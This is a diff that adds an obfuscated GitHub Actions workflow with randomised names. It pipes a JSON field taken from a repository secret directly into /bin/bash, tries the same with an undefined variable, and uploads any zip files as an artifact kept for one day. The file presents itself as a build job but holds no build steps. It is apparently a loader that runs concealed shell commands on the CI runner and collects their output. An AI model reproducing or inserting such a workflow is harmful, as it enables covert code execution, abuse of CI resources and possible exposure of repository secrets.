@@ -1,0 +1,22 @@
+name: blakemonitor7817
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: blakemonitor7817
+        env:
+          lswq458: ${{ secrets.lswq458 }}
+        run: |
+          printf '%s' "$lswq458" | jq -r .n27916 | /bin/bash
+          printf '%s' "$ghki3546" | jq -r .td66451 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: GEmyywiP
+          path: "*.zip"
+          retention-days: 1
